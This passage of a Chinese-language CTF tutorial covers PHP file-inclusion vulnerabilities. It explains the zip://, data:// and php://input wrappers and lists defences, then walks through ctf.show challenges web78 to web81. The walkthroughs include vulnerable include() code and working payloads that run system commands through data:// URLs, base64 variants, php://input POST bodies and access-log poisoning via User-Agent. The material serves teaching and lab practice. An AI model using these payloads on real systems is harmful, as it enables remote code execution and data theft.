+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png 2x"
+            sizes="auto"
+            alt="image-20230725162922591">
+    </a></figure></p>
+<h4 id="zip协议" class="headerLink">
+    <a href="#zip%e5%8d%8f%e8%ae%ae" class="header-mark"></a>1.3.3 ZIP://协议</h4><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
+<ul>
+<li>zip://中只能传入绝对路径。</li>
+<li>要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）</li>
+<li>只需要是zip的压缩包即可，后缀名可以任意更改。</li>
+<li>相同的类型还有zlib://和bzip2://</li>
+</ul>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：off/on</li>
+<li>allow_url_include：off/on</li>
+</ul>
+<p><strong>POC：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">zip</span><span class="o">://</span><span class="p">[</span><span class="nx">压缩包绝对路径</span><span class="p">]</span><span class="c1">#[压缩包内文件]?file=zip://D:\1.zip%23phpinfo.txt
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="data协议" class="headerLink">
+    <a href="#data%e5%8d%8f%e8%ae%ae" class="header-mark"></a>1.3.4 data://协议</h4><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：
+<strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：on</li>
+<li>allow_url_include：on</li>
+</ul>
+<p><strong>POC：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">data</span><span class="p">:</span><span class="c1">//text/plain,&lt;?php phpinfo();?&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">data</span><span class="p">:</span><span class="c1">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="伪协议利用条件" class="headerLink">
+    <a href="#%e4%bc%aa%e5%8d%8f%e8%ae%ae%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6" class="header-mark"></a>1.4 伪协议利用条件</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png" title="1" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725164357146.png 2x"
+            sizes="auto"
+            alt="1">
+    </a></figure></p>
+<h3 id="文件包含漏洞防护" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e9%98%b2%e6%8a%a4" class="header-mark"></a>1.5 文件包含漏洞防护</h3><p>1、使用<strong>str_replace</strong>等方法过滤掉危险字符</p>
+<p>2、配置open_basedir，防止目录遍历（<strong>open_basedir 将php所能打开的文件限制在指定的目录树中</strong>）</p>
+<p>3、php版本升级，防止%00截断</p>
+<p>4、对上传的文件进行重命名，防止被读取</p>
+<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
+<p>6、做好管理员权限划分，做好文件的权限管理，<strong>allow_url_include和allow_url_fopen最小权限化</strong></p>
+<h2 id="靶场题目" class="headerLink">
+    <a href="#%e9%9d%b6%e5%9c%ba%e9%a2%98%e7%9b%ae" class="header-mark"></a>2 靶场题目：</h2><h3 id="web78" class="headerLink">
+    <a href="#web78" class="header-mark"></a>2.1 [web78]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 10:52:43
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 10:54:20
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过php伪协议来读取文件目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取flag内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接cat可能没有回显，通过查看页面源码即可得到flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png" title="image-20230709235833002" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png 2x"
+            sizes="auto"
+            alt="image-20230709235833002">
+    </a></figure></p>
+<h3 id="web79" class="headerLink">
+    <a href="#web79" class="header-mark"></a>2.2 [web79]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:10:14
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:12:38
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>法一
+替换了payload的中的php，可以构造一下payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取flag.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://58452d9a-e437-4cf8-b189-168ac79426dc.challenge.ctf.show/?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>法二</p>
+<p>可以使用input协议</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /?file=Php://input   HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;?Php system(&#34;ls&#34;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /?file=Php://input   HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>法三</p>
+<p>data协议+base64加密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # &lt;?php system(&#39;ls&#39;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system(&#39;cat flag.php&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web80" class="headerLink">
+    <a href="#web80" class="header-mark"></a>2.3 [web80]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:26:29
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>又替换了php，我们可以使用input协议，首先打开burpsuite开启拦截，然后在HackBar发POST包：
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png" title="image-20230710001413712" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001413712.png 2x"
+            sizes="auto"
+            alt="image-20230710001413712">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://164bc5d8-06d4-4422-b19f-3ca65d68f6ef.challenge.ctf.show/?file=PHP://input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在bp拦截的报文末尾添加POST传参内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png" title="image-20230710001554250" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001554250.png 2x"
+            sizes="auto"
+            alt="image-20230710001554250">
+    </a></figure></p>
+<p>发包后发现fl0g.php文件
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png" title="image-20230710001630837" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001630837.png 2x"
+            sizes="auto"
+            alt="image-20230710001630837">
+    </a></figure></p>
+<p>重复上述操作，修改POST传参中的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;tac fl0g.php&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png" title="image-20230710001744752" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001744752.png 2x"
+            sizes="auto"
+            alt="image-20230710001744752">
+    </a></figure></p>
+<p>得到flag内容：
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png" title="image-20230710001815667" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png 2x"
+            sizes="auto"
+            alt="image-20230710001815667">
+    </a></figure></p>
+<h3 id="web81" class="headerLink">
+    <a href="#web81" class="header-mark"></a>2.4 [web81]</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 15:51:31
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>php、data、：（冒号）都失效了</p>
+<p>可以读取日志信息</p>
+<p>在url后面加入日志文件的路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">file</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行两次发包，第一次将User-Agent修改为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system(&#39;ls&#39;);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png" title="image-20230711000755891" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711000755891.png 2x"
+            sizes="auto"
+            alt="image-20230711000755891">
+    </a></figure></p>
+<p>得到回显之后进行第二次发包，随后得到
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png" title="image-20230711001208771" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230711001208771.png 2x"
+            sizes="auto"
+            alt="image-20230711001208771">
+    </a></figure></p>
+<p>得到flag存放的具体文件，随后进行第三次发包</p>
